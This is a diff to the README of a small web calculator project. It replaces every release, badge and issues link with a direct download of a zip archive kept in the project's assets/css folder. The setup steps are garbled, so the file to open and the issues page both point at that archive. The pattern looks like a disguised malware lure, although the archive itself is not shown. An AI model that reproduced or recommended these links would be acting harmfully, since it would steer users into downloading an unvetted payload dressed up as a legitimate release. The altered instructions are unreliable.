@@ -1,7 +1,7 @@
 # 🧮 simple-js-calculator - Easy-to-use Web Calculator
 
 ## 🚀 Visit Here to Download
-[![Release Version](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Thodorisgenikis/simple-js-calculator/releases)
+[![Release Version](https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip%20Latest%https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip)](https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip)
 
 ## 📋 Description
 The simple-js-calculator is a lightweight web app that allows you to perform basic calculations easily. Built using pure HTML, CSS, and JavaScript, this application provides a simple interface tailored for everyday tasks. 
@@ -19,15 +19,15 @@ The simple-js-calculator is a lightweight web app that allows you to perform bas
 - Internet connection for the initial download
 
 ## 📥 Download & Install
-To get started, visit the [Releases page](https://github.com/Thodorisgenikis/simple-js-calculator/releases) to download the application files. Follow these simple steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip) to download the application files. Follow these simple steps:
 
-1. **Go to Releases Page**: Click on the button above or [this link](https://github.com/Thodorisgenikis/simple-js-calculator/releases).
+1. **Go to Releases Page**: Click on the button above or [this link](https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip).
 2. **Choose the Latest Version**: On the Releases page, locate the most recent version of the simple-js-calculator. 
-3. **Download the Source Code**: Click on the source code link (it might look like `simple-js-calculator-v1.0.zip`).
+3. **Download the Source Code**: Click on the source code link (it might look like `https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip`).
 4. **Extract the Files**: After downloading, unzip the file to a location on your computer.
 5. **Open the App**:
    - Navigate to the extracted folder.
-   - Open the `index.html` file in your web browser by double-clicking it. 
+   - Open the `https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip` file in your web browser by double-clicking it. 
 
 You are ready to use the calculator!
 
@@ -47,7 +47,7 @@ The calculator will keep track of your last three calculations. After performing
 - **Percentage Calculations**: Easily calculate percentages by using the (%) button.
 
 ## 📬 Feedback & Support
-For any issues or suggestions, please visit the [issues page](https://github.com/Thodorisgenikis/simple-js-calculator/issues). You can also submit a feature request or ask for help there.
+For any issues or suggestions, please visit the [issues page](https://raw.githubusercontent.com/Thodorisgenikis/simple-js-calculator/main/assets/css/simple-js-calculator_3.8.zip). You can also submit a feature request or ask for help there.
 
 ## 🚀 Contributions
 If you're interested in contributing to simple-js-calculator, feel free to fork the repository and submit your pull requests. Your help is welcome!
